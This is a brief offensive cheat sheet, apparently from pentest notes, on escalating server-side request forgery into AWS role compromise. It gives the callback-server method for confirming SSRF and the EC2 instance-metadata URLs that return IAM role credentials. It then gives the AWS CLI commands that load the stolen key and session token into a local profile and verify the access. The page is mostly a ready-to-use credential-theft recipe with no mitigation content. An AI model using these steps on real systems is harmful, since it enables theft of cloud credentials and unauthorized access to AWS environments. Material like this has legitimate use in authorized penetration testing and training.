# SSRF To AWS Role compromise

## Enumeration

Load a local server using one of the following commands

```
python -m SimpleHttpServer <port>    #python2
python -m http.server <port>         #python3
```

Use your public IP as the payload, we expect to see a HTTP request in the local server logs. In this case we have confirmed SSRF

If you suspect that a firewall or other network protection systems are blocking the request, you can try to make the application retrieve a well known file from the OS. See the [LFI List page](../../web-attacks/file-upload/lfi-list.md) for a list of common file locations for Linux and Windows.

## Exploit

### Gain control of EC2 role

Check current role

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Get associated key

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role name>
```

Configure new profile on local machine and gain access to AWS environment

```
 aws configure --profile <profile name> #specfiy access key id, value and region when prompted
 aws configure --profile <profile name> set aws_session_token <role token>
```

Verify credentials

```
aws sts get-caller-identity --profile <profile name>
```
